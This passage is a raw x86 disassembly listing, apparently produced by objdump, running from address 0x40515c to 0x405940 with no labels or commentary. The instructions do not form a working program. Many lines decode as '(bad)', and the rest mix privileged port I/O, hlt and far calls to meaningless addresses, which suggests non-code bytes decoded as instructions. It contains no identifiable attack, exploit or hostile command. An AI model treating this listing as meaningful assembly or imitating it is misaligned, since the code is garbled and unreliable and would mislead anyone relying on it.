  40515c:	xor    al,0xcb
  40515e:	xchg   edx,eax
  40515f:	inc    ebp
  405160:	jmp    0x40518e
  405162:	sbb    edi,edi
  405164:	sub    dl,al
  405166:	inc    esi
  405167:	jg     0x40513d
  405169:	add    al,0x86
  40516b:	ins    DWORD PTR es:[edi],dx
  40516c:	test   BYTE PTR [ebp-0x66d4156d],0x55
  405173:	imul   ebx,DWORD PTR [edx+esi*1],0xea1b8653
  40517a:	mov    edi,0x91be9677
  40517f:	loopne 0x405196
  405181:	mov    esi,0xd8cf1b4f
  405186:	sbb    al,0x73
  405188:	cmp    ah,dh
  40518a:	dec    esi
  40518b:	loope  0x405129
  40518d:	(bad)  
  40518e:	or     eax,DWORD PTR [ebx+0x49cd66a4]
  405194:	ins    BYTE PTR es:[edi],dx
  405195:	adc    al,0x83
  405197:	cmp    BYTE PTR [eax+0x23],dl
  40519a:	fisubr DWORD PTR [edi+0x61]
  40519d:	dec    ebp
  40519e:	adc    eax,esi
  4051a0:	ficomp WORD PTR [ebx+0x70]
  4051a3:	in     al,0x17
  4051a5:	pop    ecx
  4051a6:	cmp    eax,0x6a4ab455
  4051ab:	fidiv  WORD PTR [esi-0x5a1eca95]
  4051b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051b2:	test   BYTE PTR [ebx],ah
  4051b4:	lods   al,BYTE PTR ds:[esi]
  4051b5:	jb     0x405227
  4051b7:	stos   BYTE PTR es:[edi],al
  4051b8:	jne    0x40518c
  4051ba:	mov    cl,0x97
  4051bc:	jb     0x4051df
  4051be:	pop    ebp
  4051bf:	xchg   edi,eax
  4051c0:	cmp    al,0xc2
  4051c2:	jp     0x40514d
  4051c4:	cmp    edi,edx
  4051c6:	hlt    
  4051c7:	test   eax,0x661b68e1
  4051cc:	mov    al,0x6a
  4051ce:	jo     0x4051d2
  4051d0:	push   es
  4051d1:	lea    esi,[edi]
  4051d3:	test   BYTE PTR [ebx+0x6b],0xa2
  4051d7:	nop
  4051d8:	test   al,0x8d
  4051da:	sub    eax,0xc0110707
  4051df:	mov    ds,WORD PTR [ebx]
  4051e1:	jo     0x405257
  4051e3:	out    0x50,al
  4051e5:	mov    ebx,0x5c6f329c
  4051ea:	xlat   BYTE PTR ds:[ebx]
  4051eb:	cld    
  4051ec:	jecxz  0x405245
  4051ee:	mov    ah,0xc9
  4051f0:	push   edx
  4051f1:	cmp    edx,ebp
  4051f3:	adc    ah,BYTE PTR [esi+edx*8-0x7df61d6f]
  4051fa:	retf   
  4051fb:	xor    eax,0xf3227143
  405200:	or     eax,0x98214390
  405205:	or     al,0x93
  405207:	mov    al,ds:0x36deb4ea
  40520c:	hlt    
  40520d:	clc    
  40520e:	dec    ecx
  40520f:	mov    bh,BYTE PTR [esi]
  405211:	(bad)  
  405212:	pushf  
  405213:	push   esi
  405214:	(bad)  
  405215:	int    0x9
  405217:	scas   eax,DWORD PTR es:[edi]
  405218:	stos   BYTE PTR es:[edi],al
  405219:	push   ecx
  40521a:	iret   
  40521b:	out    dx,al
  40521c:	mov    ecx,DWORD PTR [ecx-0x492c8126]
  405222:	cs lods eax,DWORD PTR ss:[esi]
  405225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405226:	repz and al,0x89
  405229:	push   edi
  40522a:	push   esp
  40522b:	rcl    BYTE PTR [ebx-0x4e],cl
  40522e:	das    
  40522f:	push   edx
  405230:	call   0x2c4c5013
  405235:	in     eax,dx
  405236:	js     0x405223
  405238:	xchg   edx,eax
  405239:	pop    ss
  40523a:	aaa    
  40523b:	cmp    DWORD PTR [edx],eax
  40523d:	retf   
  40523e:	(bad)  
  40523f:	and    eax,0x2c1378d1
  405244:	xchg   edi,eax
  405245:	adc    ah,BYTE PTR [ecx-0x146b9b3]
  40524b:	mov    bl,0x90
  40524d:	mov    dh,0xb8
  40524f:	jmp    0x4052b0
  405251:	fild   QWORD PTR [esi]
  405253:	xor    al,0x7b
  405255:	repnz and BYTE PTR [ebp+0x10],bh
  405259:	push   0x42
  40525b:	repz push esp
  40525d:	ret    0xb1ee
  405260:	sub    al,0xed
  405262:	stos   DWORD PTR es:[edi],eax
  405263:	mov    ss,WORD PTR [ecx-0x3ccb0b99]
  405269:	adc    eax,0xdc2fb062
  40526e:	push   edi
  40526f:	and    BYTE PTR [edi+0x32],dl
  405272:	jle    0x4052e4
  405274:	push   ebp
  405275:	pop    esi
  405276:	push   ebx
  405277:	or     eax,DWORD PTR [ebp+edx*1+0x4eb18740]
  40527e:	test   BYTE PTR [ecx],al
  405280:	fmul   st,st(0)
  405282:	xor    DWORD PTR [esi-0x22],edi
  405285:	xchg   BYTE PTR [eax+0x69074907],bh
  40528b:	jg     0x405229
  40528d:	push   ebx
  40528e:	inc    eax
  40528f:	call   0xfc84:0xd456d6dd
  405296:	cli    
  405297:	outs   dx,BYTE PTR ds:[esi]
  405298:	cli    
  405299:	mov    ds,WORD PTR [esi]
  40529b:	sti    
  40529c:	push   eax
  40529d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40529e:	(bad)  
  40529f:	scas   al,BYTE PTR es:[edi]
  4052a0:	mov    ds:0xc3805344,al
  4052a5:	stc    
  4052a6:	fst    DWORD PTR [ebp+ebp*1+0x1]
  4052aa:	nop
  4052ab:	ins    BYTE PTR es:[edi],dx
  4052ac:	pop    ebp
  4052ad:	pop    esp
  4052ae:	rol    DWORD PTR [ecx-0x47a64143],1
  4052b4:	mov    WORD PTR [esi+ecx*2+0x2faac1bf],gs
  4052bb:	push   es
  4052bc:	push   edi
  4052bd:	adc    cl,BYTE PTR [ecx-0x552e7d15]
  4052c3:	pop    ecx
  4052c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052c5:	push   ecx
  4052c6:	out    0xc6,eax
  4052c8:	add    DWORD PTR [edx-0x1b],esi
  4052cb:	shr    BYTE PTR [edi],0x69
  4052ce:	popf   
  4052cf:	push   ds
  4052d0:	pop    edi
  4052d1:	into   
  4052d2:	push   ds
  4052d3:	mov    al,0xb4
  4052d5:	ins    BYTE PTR es:[edi],dx
  4052d6:	rol    dl,cl
  4052d8:	xor    al,0x63
  4052da:	push   edx
  4052db:	in     eax,0xad
  4052dd:	lock mov ds:0x44be36d1,eax
  4052e3:	cwde   
  4052e4:	sbb    DWORD PTR [eax+edx*2+0x7cb565c8],ebx
  4052eb:	jae    0x4052a8
  4052ed:	jns    0x405289
  4052ef:	out    0x36,al
  4052f1:	outs   dx,BYTE PTR ds:[esi]
  4052f2:	out    0x28,al
  4052f4:	mov    edi,0xad293d1d
  4052f9:	xchg   edx,eax
  4052fa:	pop    ecx
  4052fb:	popf   
  4052fc:	push   eax
  4052fd:	out    0xb9,al
  4052ff:	jno    0x40537b
  405301:	rdtsc  
  405303:	sbb    al,BYTE PTR [ecx-0x379be5ca]
  405309:	enter  0xe047,0x89
  40530d:	mov    cl,0xbc
  40530f:	xchg   ebx,eax
  405310:	mov    BYTE PTR [edx+0x78d829c9],cl
  405316:	pop    edx
  405317:	or     dl,ch
  405319:	pop    ds
  40531a:	push   eax
  40531b:	sub    esp,DWORD PTR [esi+0x246a3146]
  405321:	xchg   DWORD PTR [eax+0x56f22a74],eax
  405327:	or     ecx,edx
  405329:	fsubr  QWORD PTR [ebp-0x761d6f2d]
  40532f:	int3   
  405330:	jl     0x40534e
  405332:	out    0xc4,al
  405334:	xchg   ebp,eax
  405335:	xchg   ecx,eax
  405336:	add    cl,dh
  405338:	jns    0x405395
  40533a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40533b:	leave  
  40533c:	lahf   
  40533d:	jle    0x4052d5
  40533f:	es mov edi,0xdcc4960d
  405345:	pop    esp
  405346:	data16 sbb ah,BYTE PTR [edx]
  405349:	stos   BYTE PTR es:[edi],al
  40534a:	mov    esi,0xc81465f3
  40534f:	push   ebx
  405350:	(bad)  
  405351:	fimul  WORD PTR [edx+ebp*2-0x4f]
  405355:	cmp    ecx,DWORD PTR [edx]
  405357:	fisub  WORD PTR [ebp+0x5e]
  40535a:	xor    esp,edx
  40535c:	jle    0x405333
  40535e:	add    ch,BYTE PTR [ebx-0x2ff8f808]
  405364:	xor    ebx,DWORD PTR [ecx+0x38]
  405367:	cwde   
  405368:	and    DWORD PTR [ebx+0x1ea5bb9b],0x13100f2c
  405372:	call   0x4135235d
  405377:	das    
  405378:	dec    ecx
  405379:	ffreep st(3)
  40537b:	sti    
  40537c:	push   edi
  40537d:	add    BYTE PTR [edx+0x49],ch
  405380:	pop    ss
  405381:	das    
  405382:	ret    0xdffe
  405385:	sbb    esi,esi
  405387:	sbb    bh,BYTE PTR [edx-0x1e0cce61]
  40538d:	mov    edx,DWORD PTR [ebx]
  40538f:	dec    eax
  405390:	jno    0x405368
  405392:	aaa    
  405393:	sub    eax,0xc056957a
  405398:	gs sahf 
  40539a:	push   eax
  40539b:	call   0xeaed:0xd53b90d2
  4053a2:	or     eax,0xede08200
  4053a7:	and    eax,0x2b7f1c3d
  4053ac:	mov    dl,0x3f
  4053ae:	xor    al,0x10
  4053b0:	pop    ss
  4053b1:	add    edx,DWORD PTR [ebx+0x20d374b7]
  4053b7:	stos   BYTE PTR es:[edi],al
  4053b8:	aad    0x11
  4053ba:	sub    ecx,DWORD PTR [edx-0x7f074012]
  4053c0:	xchg   ebx,eax
  4053c1:	sbb    eax,0xacfe2da8
  4053c6:	mov    WORD PTR [esi+0x4b8aa8d1],cs
  4053cc:	mov    cl,BYTE PTR [ecx+0x12456127]
  4053d2:	push   ebp
  4053d3:	imul   esi,DWORD PTR [edx+esi*2],0x5c33ec0f
  4053da:	fs ins DWORD PTR es:[edi],dx
  4053dc:	jmp    0x23a9:0xb40fca1a
  4053e3:	out    0x53,al
  4053e5:	iret   
  4053e6:	xchg   ecx,eax
  4053e7:	scas   al,BYTE PTR es:[edi]
  4053e8:	adc    DWORD PTR ds:0x8636b51d,edi
  4053ee:	aam    0xe0
  4053f0:	lods   al,BYTE PTR ds:[esi]
  4053f1:	scas   eax,DWORD PTR es:[edi]
  4053f2:	stos   DWORD PTR es:[edi],eax
  4053f3:	jp     0x40537d
  4053f5:	mov    eax,ds:0x73d338ae
  4053fa:	lds    esp,FWORD PTR [esi+0x1167d100]
  405400:	test   DWORD PTR [esi+0x6],0xf60a6aae
  405407:	dec    edx
  405408:	ret    0x184a
  40540b:	enter  0xc83b,0xf5
  40540f:	pop    es
  405410:	in     al,0xa4
  405412:	or     DWORD PTR [ebx],esp
  405414:	in     eax,dx
  405415:	or     eax,0xde588889
  40541a:	push   ebx
  40541b:	cmp    BYTE PTR [edi+edx*2-0x7a],cl
  40541f:	dec    eax
  405420:	sbb    eax,0xc9f159e2
  405425:	jle    0x4053c7
  405427:	xchg   DWORD PTR [ecx+eax*4],esp
  40542a:	sub    eax,0x23909977
  40542f:	jns    0x405421
  405431:	jbe    0x40542f
  405433:	push   esi
  405434:	pop    ss
  405435:	enter  0xfcd1,0x6a
  405439:	add    eax,0x8f675f5d
  40543e:	pop    esp
  40543f:	mov    ds,WORD PTR [edx+0x3fa10fda]
  405445:	inc    eax
  405446:	pop    ds
  405447:	pop    esi
  405448:	inc    BYTE PTR [ebx+0xa35e516]
  40544e:	je     0x405454
  405450:	test   eax,0xe957d404
  405455:	pop    ecx
  405456:	scas   eax,DWORD PTR es:[edi]
  405457:	repz mov ah,0xed
  40545a:	add    al,bl
  40545c:	jle    0x405476
  40545e:	call   0xc14a:0xd4b0ff06
  405465:	out    dx,eax
  405466:	cwd    
  405468:	retf   0xe661
  40546b:	mov    fs,WORD PTR [ebp+ebp*2-0x5]
  40546f:	ins    DWORD PTR es:[edi],dx
  405470:	fcmovnu st,st(5)
  405472:	cmp    DWORD PTR [ebx],eax
  405474:	inc    edx
  405475:	jecxz  0x4054f0
  405477:	scas   al,BYTE PTR es:[edi]
  405478:	test   DWORD PTR [esi+0x32682999],ebp
  40547e:	xor    bl,al
  405480:	inc    edx
  405482:	sub    al,0x68
  405484:	(bad)  
  405485:	jns    0x405462
  405487:	fsubr  DWORD PTR [edi]
  405489:	shr    BYTE PTR [edi+0x45],1
  40548c:	xchg   BYTE PTR [di+0xa7c],bh
  405491:	and    edi,0xffffffeb
  405494:	or     ah,ah
  405496:	(bad)  
  405497:	imul   ebp,DWORD PTR [ebp+0x25],0x831c2181
  40549e:	out    0x9a,eax
  4054a0:	inc    eax
  4054a1:	imul   eax,DWORD PTR [edx+edi*8],0xa481fccf
  4054a8:	xor    DWORD PTR [ebx],edx
  4054aa:	inc    eax
  4054ab:	ror    dh,0x55
  4054ae:	dec    ebp
  4054af:	xchg   esi,edi
  4054b1:	jnp    0x4054df
  4054b3:	or     esp,DWORD PTR [ebx+0x2e]
  4054b6:	inc    esp
  4054b7:	jno    0x4054ec
  4054b9:	jo     0x405447
  4054bb:	repz inc esp
  4054bd:	and    al,0x9
  4054bf:	test   BYTE PTR [edx-0x6d],0x4e
  4054c3:	js     0x405487
  4054c5:	pop    esi
  4054c6:	sahf   
  4054c7:	cmp    DWORD PTR [ecx-0x1a73201e],0x4cc126eb
  4054d1:	dec    ebp
  4054d2:	les    edi,FWORD PTR [ebp-0x54]
  4054d5:	sub    bh,bh
  4054d7:	ja     0x40551d
  4054d9:	dec    esp
  4054da:	pop    ecx
  4054db:	imul   edx,DWORD PTR [eax+edi*2-0x74],0x86d7c530
  4054e3:	je     0x405465
  4054e5:	iret   
  4054e6:	jns    0x4054be
  4054e8:	ficomp WORD PTR [edi+eax*2]
  4054eb:	test   BYTE PTR [esi+eax*1],bl
  4054ee:	ret    0x59be
  4054f1:	cmp    BYTE PTR [ebx+0x3357c694],bl
  4054f7:	mov    bh,0x4
  4054f9:	lahf   
  4054fa:	mov    esi,0xf5c969cd
  4054ff:	xchg   edi,eax
  405500:	mov    ah,0x1a
  405502:	out    dx,al
  405503:	cld    
  405504:	xor    ebx,edx
  405506:	fst    QWORD PTR [ebp+0x1d]
  405509:	mov    esp,0x39e6e97d
  40550e:	push   ss
  40550f:	mov    ebx,0xee5bccdd
  405514:	stc    
  405515:	pusha  
  405516:	cdq    
  405517:	jnp    0x4054cd
  405519:	popf   
  40551a:	inc    esp
  40551b:	mov    ebx,0xc297cfeb
  405520:	cmp    al,0xf1
  405522:	push   ebx
  405523:	fidivr DWORD PTR [esi+0x7d8d2be8]
  405529:	cdq    
  40552a:	dec    edx
  40552b:	pop    ss
  40552c:	jb     0x405505
  40552e:	arpl   WORD PTR [ebx+0x10],sp
  405531:	jge    0x405562
  405533:	and    BYTE PTR [edx+0x72],bl
  405536:	mov    ebx,0x384d0a87
  40553b:	sub    eax,0x9c59169f
  405540:	mov    esp,eax
  405542:	jmp    0x4358:0xbe145adb
  405549:	add    bh,al
  40554b:	je     0x4055a9
  40554d:	mov    al,ds:0x3325abc9
  405552:	mov    al,0x4f
  405554:	push   esp
  405555:	mov    dl,0xe5
  405557:	bound  edx,QWORD PTR [ebx+0x41]
  40555a:	enter  0x4e37,0x3b
  40555e:	ss aaa 
  405560:	add    dh,BYTE PTR ds:0xd4970a94
  405566:	adc    bh,ch
  405568:	jnp    0x405526
  40556a:	outs   dx,DWORD PTR ds:[esi]
  40556b:	daa    
  40556c:	xchg   BYTE PTR [ecx+0x2079d466],dh
  405572:	sti    
  405573:	xchg   BYTE PTR [edx+0x6c],dl
  405576:	(bad)  
  405577:	fist   DWORD PTR [ebp-0x40]
  40557a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40557b:	fs lock sbb ch,BYTE PTR ds:[ebp+0x53]
  405581:	jbe    0x40553b
  405583:	loop   0x405568
  405585:	pusha  
  405586:	push   0xa66d37ce
  40558b:	sbb    al,0x93
  40558d:	dec    eax
  40558e:	fwait
  40558f:	add    al,0x48
  405591:	div    BYTE PTR [eax+0x12]
  405594:	dec    esp
  405595:	fsub   st(0),st
  405597:	sub    edi,DWORD PTR [ecx]
  405599:	cmp    ah,BYTE PTR [eax]
  40559b:	ret    
  40559c:	jle    0x405587
  40559e:	inc    edi
  40559f:	add    edi,DWORD PTR [ebx]
  4055a1:	mov    DWORD PTR [esi-0x72],ebp
  4055a4:	call   0x2721:0xbcb1621a
  4055ab:	xchg   edx,eax
  4055ac:	out    dx,eax
  4055ad:	push   esi
  4055ae:	fdiv   QWORD PTR [ebx+0x2]
  4055b1:	es aas 
  4055b3:	mov    esp,ecx
  4055b5:	retf   
  4055b6:	pop    eax
  4055b7:	aam    0x28
  4055b9:	ins    BYTE PTR es:[edi],dx
  4055ba:	pushf  
  4055bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055bc:	jae    0x4055fb
  4055be:	push   esi
  4055bf:	pop    es
  4055c0:	cmp    al,BYTE PTR [edi+0x46]
  4055c3:	adc    eax,0x95d4eba1
  4055c8:	fadd   DWORD PTR [ecx+ebx*4+0x5]
  4055cc:	xor    ch,al
  4055ce:	data16 lahf 
  4055d0:	add    ebp,DWORD PTR [edi-0x4424003f]
  4055d6:	shl    BYTE PTR [edx],cl
  4055d8:	mov    eax,0x435e07cc
  4055dd:	mov    dh,0xd7
  4055df:	ret    
  4055e0:	inc    ebp
  4055e1:	arpl   di,bx
  4055e3:	cmc    
  4055e4:	hlt    
  4055e5:	mov    dh,0xbd
  4055e7:	and    DWORD PTR ds:0x6e7d55f1,esi
  4055ed:	mov    al,es:0x2b866c38
  4055f3:	push   edi
  4055f4:	inc    esi
  4055f5:	pop    ebx
  4055f6:	adc    DWORD PTR [ebx+0x7ce8ca9e],ebp
  4055fc:	(bad)  
  4055fd:	shl    DWORD PTR [edx-0x7c51c5e2],1
  405603:	push   ebx
  405604:	xchg   edi,eax
  405605:	mov    BYTE PTR [edi+0x74531997],al
  40560b:	repnz les esi,FWORD PTR [ebx-0x4e]
  40560f:	imul   edx,DWORD PTR [bp+di-0x1caa],0x17
  405615:	push   ebp
  405616:	fistp  DWORD PTR [ecx+0x613b1241]
  40561c:	mov    edi,0x452d1515
  405621:	pop    edx
  405622:	inc    esp
  405623:	dec    esi
  405624:	mov    BYTE PTR [eax-0x714df530],dh
  40562a:	mov    ds:0xf44a65e4,al
  40562f:	and    ah,dh
  405631:	xchg   esi,eax
  405632:	xchg   edx,eax
  405633:	dec    esp
  405634:	cli    
  405635:	fucom  st(7)
  405637:	adc    DWORD PTR [esp+ebx*4],ecx
  40563a:	jl     0x405695
  40563c:	cmp    eax,0x538bbae6
  405641:	clc    
  405642:	out    dx,al
  405643:	clc    
  405644:	add    ch,BYTE PTR [edi+0x14]
  405647:	ss (bad) 
  405649:	cld    
  40564a:	and    eax,0xd3898f9e
  40564f:	stos   BYTE PTR es:[edi],al
  405650:	dec    eax
  405651:	fucom  st(6)
  405653:	xor    eax,0x1a0408de
  405658:	(bad)  
  405659:	(bad)  
  40565a:	je     0x405615
  40565c:	lds    esi,FWORD PTR [ebx]
  40565e:	xadd   dh,dh
  405661:	cmp    dh,BYTE PTR [esi-0x9535af0]
  405667:	and    bh,BYTE PTR [edi+0x1]
  40566a:	aad    0x58
  40566c:	pop    esi
  40566d:	les    esi,FWORD PTR [edx-0x4d766612]
  405673:	sub    DWORD PTR [edx+ebx*2-0x6b2d881e],ebx
  40567a:	jnp    0x4056bd
  40567c:	inc    eax
  40567d:	pop    edi
  40567e:	mov    dh,0x5d
  405680:	ins    BYTE PTR es:[edi],dx
  405681:	pop    esi
  405682:	shr    dh,cl
  405684:	pop    edx
  405685:	ins    DWORD PTR es:[edi],dx
  405686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405687:	sub    al,0x85
  405689:	jno    0x4056ad
  40568b:	push   ebx
  40568c:	push   edx
  40568d:	push   ss
  40568e:	inc    esp
  40568f:	cwde   
  405690:	mov    al,ds:0x75f73de7
  405695:	enter  0x352b,0xce
  405699:	nop
  40569a:	xchg   edi,eax
  40569b:	mov    ebx,0xa5352f18
  4056a0:	mov    esp,0x2728a329
  4056a5:	and    eax,0xc3aa619f
  4056aa:	mov    ds:0x67e01f03,al
  4056af:	rep ins BYTE PTR es:[edi],dx
  4056b1:	les    edx,FWORD PTR [eax]
  4056b3:	test   ebp,0x7990edfa
  4056b9:	stos   BYTE PTR es:[edi],al
  4056ba:	in     al,dx
  4056bb:	mov    ch,0x77
  4056bd:	jne    0x40568b
  4056bf:	sub    edx,DWORD PTR [esi+eax*2]
  4056c2:	mov    ecx,0x46deddd8
  4056c7:	cmp    ah,bh
  4056c9:	mov    ebp,0xede55ae4
  4056ce:	jno    0x405676
  4056d0:	fisttp WORD PTR [eax+0x55]
  4056d3:	adc    DWORD PTR [edi],esi
  4056d5:	std    
  4056d6:	lea    ecx,ds:0x6a03057a
  4056dc:	sti    
  4056dd:	mov    es,WORD PTR [eax+0x42]
  4056e0:	push   ss
  4056e1:	retf   
  4056e2:	add    al,0xe1
  4056e4:	adc    DWORD PTR [edx],ecx
  4056e6:	xchg   ebx,eax
  4056e7:	push   ebx
  4056e8:	aaa    
  4056e9:	fmul   QWORD PTR [eax-0xd]
  4056ec:	stos   BYTE PTR es:[edi],al
  4056ed:	jae    0x405709
  4056ef:	sbb    DWORD PTR [ecx+0x31],eax
  4056f2:	fild   WORD PTR [edi-0x22]
  4056f5:	js     0x405774
  4056f7:	mov    ebx,0x9e0f4f5a
  4056fc:	mov    ah,0xd1
  4056fe:	test   al,0x62
  405700:	int    0xb2
  405702:	mov    DWORD PTR [edi+eiz*1+0x39],eax
  405706:	cmp    al,0xd3
  405708:	fs mov al,0xbb
  40570b:	bound  ecx,QWORD PTR [eax*8+0x5dc1a48]
  405712:	ins    DWORD PTR es:[edi],dx
  405713:	adc    bh,cl
  405715:	aad    0x77
  405717:	mov    WORD PTR [eax],fs
  405719:	sahf   
  40571a:	mov    WORD PTR [eax+0x6d9d2e20],ds
  405720:	call   0x150c:0x10e2adaf
  405727:	or     ah,BYTE PTR ds:0xf8de19a5
  40572d:	sbb    cl,BYTE PTR [esi-0x29d0ed64]
  405733:	pop    edi
  405734:	arpl   WORD PTR [ebx],di
  405736:	push   ss
  405737:	mov    ebx,0xbcabc3aa
  40573c:	cmp    bl,bh
  40573e:	cli    
  40573f:	push   es
  405740:	ret    
  405741:	popa   
  405742:	(bad)  
  405743:	sub    edx,DWORD PTR [esi-0x7]
  405746:	push   esi
  405747:	sub    esp,ecx
  405749:	jo     0x4057a9
  40574b:	pop    ebx
  40574c:	repnz ins BYTE PTR es:[edi],dx
  40574e:	and    BYTE PTR [ebx+0x7d],cl
  405751:	shl    DWORD PTR [ebx-0x6b267774],1
  405757:	out    dx,al
  405758:	cmp    BYTE PTR [edx-0x66dea7b1],bh
  40575e:	add    BYTE PTR [edi+0x2b233525],bh
  405764:	lahf   
  405765:	in     al,0x47
  405767:	test   al,0x17
  405769:	dec    edi
  40576a:	out    0x98,al
  40576c:	mov    esp,0x64ac1c6e
  405771:	mov    ah,BYTE PTR [esi+0x7d]
  405774:	xchg   esi,eax
  405775:	adc    DWORD PTR [edx-0x4ecd1c2],edx
  40577b:	in     al,dx
  40577c:	pushf  
  40577d:	sbb    al,0x6
  40577f:	add    BYTE PTR [esi-0x72],0x16
  405783:	gs mov edi,0x2c0962f1
  405789:	lods   eax,DWORD PTR ds:[esi]
  40578a:	rcr    BYTE PTR [ecx],1
  40578c:	out    0x34,al
  40578e:	xlat   BYTE PTR ds:[ebx]
  40578f:	leave  
  405790:	mov    esp,0xe0cabd01
  405795:	gs and al,0xe8
  405798:	mov    al,ds:0x9044c1d7
  40579d:	sbb    edi,DWORD PTR [eax]
  40579f:	pop    es
  4057a0:	outs   dx,DWORD PTR ds:[esi]
  4057a1:	push   es
  4057a2:	rcl    DWORD PTR [ebx+esi*2],1
  4057a5:	popf   
  4057a6:	sbb    DWORD PTR [ebx+0x18dd680d],edi
  4057ac:	in     al,0x16
  4057ae:	xlat   BYTE PTR ds:[ebx]
  4057af:	and    al,al
  4057b1:	in     eax,0x2b
  4057b3:	(bad)  
  4057b4:	cmp    al,0x92
  4057b6:	sbb    eax,0x81e2596d
  4057bb:	(bad)  
  4057bc:	div    bh
  4057be:	pop    es
  4057bf:	jns    0x405775
  4057c1:	out    0x30,al
  4057c3:	test   eax,0xf165c3c7
  4057c8:	jmp    0x1bad7a8c
  4057cd:	data16 sub BYTE PTR [esi+0x11],dh
  4057d1:	loope  0x405836
  4057d3:	cmc    
  4057d4:	adc    DWORD PTR ds:0x6aab76c8,0xffffffb9
  4057db:	mov    esp,0x3a55bb36
  4057e0:	xchg   edi,eax
  4057e1:	test   eax,0x2787d75a
  4057e6:	fcom   st(4)
  4057e8:	add    eax,0x8f4b1d71
  4057ed:	repnz inc edx
  4057ef:	and    eax,DWORD PTR [ebx+0x69d6dcf1]
  4057f5:	aas    
  4057f6:	leave  
  4057f7:	sub    al,0x29
  4057f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057fa:	push   es
  4057fb:	mov    ebx,edx
  4057fd:	pop    edi
  4057fe:	mov    al,0xc6
  405800:	and    al,0x40
  405802:	popa   
  405803:	bound  ebx,QWORD PTR [ebx]
  405805:	cmp    ebp,DWORD PTR [edi]
  405807:	les    edi,FWORD PTR [ecx+0x4f106924]
  40580d:	mov    dl,0x83
  40580f:	shr    BYTE PTR [ecx+0x40],1
  405812:	pushf  
  405813:	(bad)  
  405814:	sbb    eax,0x309945d4
  405819:	inc    ebx
  40581a:	mov    dh,0x2
  40581c:	mov    ecx,DWORD PTR [ecx-0x608e4150]
  405822:	retf   0x6709
  405825:	and    DWORD PTR [ecx+esi*1+0x41847eb6],edx
  40582c:	loop   0x405855
  40582e:	inc    esp
  40582f:	ret    0x901
  405832:	pop    esp
  405833:	cmp    esp,DWORD PTR [esi+0x2b]
  405836:	push   ebx
  405837:	call   0x448a:0xa9da7b78
  40583e:	(bad)  
  40583f:	mov    DWORD PTR [ebx],eax
  405841:	adc    dh,BYTE PTR [eax+0x26ee9b44]
  405847:	(bad)  
  405848:	and    BYTE PTR [ecx],dl
  40584a:	std    
  40584b:	mov    ds:0xcf4f4894,eax
  405850:	xchg   ebp,eax
  405851:	sar    DWORD PTR [ecx],0xa9
  405854:	add    eax,0x511f050f
  405859:	jge    0x40581f
  40585b:	sub    cl,ch
  40585d:	mov    WORD PTR [eax],ds
  40585f:	pop    esp
  405860:	mov    eax,0x267ea645
  405865:	xlat   BYTE PTR ds:[ebx]
  405866:	mov    bl,0x72
  405868:	mov    edx,0xac7f51e3
  40586d:	(bad)  
  40586e:	xor    DWORD PTR [edx+edi*8],ebx
  405871:	xchg   ebp,eax
  405872:	mov    edx,esp
  405874:	xor    DWORD PTR ds:0x97d875e3,eax
  40587a:	push   edx
  40587b:	test   BYTE PTR [ecx+0x4d],dl
  40587e:	aas    
  40587f:	stos   BYTE PTR es:[edi],al
  405880:	sar    DWORD PTR [esi-0x4ab88fec],cl
  405886:	dec    ebx
  405887:	cli    
  405888:	xchg   esp,eax
  405889:	cmp    ah,BYTE PTR gs:[eax+0x1a]
  40588d:	mov    ah,0xb4
  40588f:	ret    
  405890:	popa   
  405891:	aad    0xf
  405893:	stc    
  405894:	pop    ss
  405895:	adc    BYTE PTR [ebp-0x7af2b3c2],0x9c
  40589c:	inc    ecx
  40589d:	xchg   ecx,eax
  40589e:	cmp    BYTE PTR [edx+ebx*2-0x2353e9b0],dl
  4058a5:	gs retf 0x465d
  4058a9:	out    dx,al
  4058aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058ab:	jne    0x40588f
  4058ad:	ja     0x40586a
  4058af:	(bad)  
  4058b0:	shr    DWORD PTR [edi+ebp*1+0x4ad22cd0],1
  4058b7:	xor    ecx,eax
  4058b9:	sbb    al,0x34
  4058bb:	out    dx,eax
  4058bc:	add    bh,ah
  4058be:	push   0xdfe7e62c
  4058c3:	out    dx,eax
  4058c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058c5:	pop    eax
  4058c6:	inc    esi
  4058c7:	or     dl,BYTE PTR [eax+0x7b]
  4058ca:	mov    edx,edi
  4058cc:	leave  
  4058cd:	and    esi,DWORD PTR [edi-0x5adead4a]
  4058d3:	fistp  QWORD PTR [esp+ebx*1]
  4058d6:	and    bh,0x34
  4058d9:	mov    ah,BYTE PTR [eax+0x2d]
  4058dc:	sub    al,0x5f
  4058de:	and    esp,ecx
  4058e0:	jl     0x405880
  4058e2:	and    eax,0x547e33c7
  4058e7:	cmp    BYTE PTR [edx],0xec
  4058ea:	xor    edx,DWORD PTR [eax+0x7a47ea0]
  4058f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058f1:	popfw  
  4058f3:	mov    edx,0x5f2534a
  4058f8:	ret    
  4058f9:	mov    ecx,eax
  4058fb:	add    ch,cl
  4058fd:	inc    esi
  4058fe:	mov    edi,0x26eceaf0
  405903:	jecxz  0x4058a1
  405905:	push   eax
  405906:	push   eax
  405907:	rcr    esp,0xb5
  40590a:	lds    esi,FWORD PTR [ecx]
  40590c:	dec    BYTE PTR [esi+0x57]
  40590f:	call   0xdb3a194e
  405914:	std    
  405915:	fidiv  WORD PTR [eax+0x6a]
  405918:	nop
  405919:	and    eax,0xe16f56f5
  40591e:	(bad)  
  40591f:	bound  edx,QWORD PTR [edi-0x19b349a6]
  405925:	call   0xa582:0x2121a0eb
  40592c:	sub    DWORD PTR [edx+0x59],esi
  40592f:	and    DWORD PTR [eax+0x4e],ecx
  405932:	inc    esi
  405933:	add    ebp,edx
  405935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405936:	xchg   edx,eax
  405937:	mov    eax,ds:0xef1b58bd
  40593c:	(bad)  
  40593d:	pop    ss
  40593e:	sub    ecx,DWORD PTR [esi]
  405940:	pop    ecx
